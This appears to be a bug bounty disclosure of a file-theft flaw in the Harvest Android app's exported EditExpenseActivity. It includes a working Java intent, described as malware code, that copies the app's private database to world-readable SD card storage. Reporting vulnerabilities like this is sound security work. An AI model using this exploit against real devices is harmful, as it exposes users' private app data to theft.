Summary:

Hi. I have found an issue which allows to retrieve any files from **_/data/data/com.harvestapp/*_** directory. The problem is in exported activity com.harvestapp.app.EditExpenseActivity which accepts URI to a pdf to be processed and saved it on SD Card which is world accessible directory, but in real world it does not validate which file is given, so I can enter any uri and this file will be copied to **_/sdcard/Android/data/com.harvestapp/files/<current time stamp>.pdf_**

Here is a PoC of stealing **_/data/data/com.harvestapp/databases/harvest.db_**

Code of the malware app:
```java
        Intent intent = new Intent("android.intent.action.SEND");
        intent.setClassName("com.harvestapp", "com.harvestapp.app.EditExpenseActivity");
        intent.setType("application/pdf");
        intent.putExtra("android.intent.extra.STREAM", Uri.parse("file:///data/data/com.harvestapp/databases/harvest.db"));
        startActivity(intent);
```

Screenshots of results are attached
